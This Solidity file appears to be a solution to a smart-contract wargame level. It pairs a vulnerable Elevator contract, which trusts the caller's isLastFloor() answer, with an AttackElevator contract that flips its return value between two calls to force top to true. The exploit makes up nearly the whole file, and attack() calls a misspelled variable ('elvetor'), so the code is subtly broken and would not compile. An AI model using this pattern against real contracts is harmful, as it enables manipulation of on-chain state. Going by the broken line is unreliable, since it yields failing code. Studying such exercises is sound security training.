// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}

contract AttackElevator {
   Elevator elevator;
   bool flag = true;
   constructor(address _elevator) {
        elevator = Elevator(_elevator);
    }
    function isLastFloor(uint256) external returns (bool) {
        flag = !flag;
        return flag;
    }

    function attack() public {
        elvetor.goTo(21);

    }
}
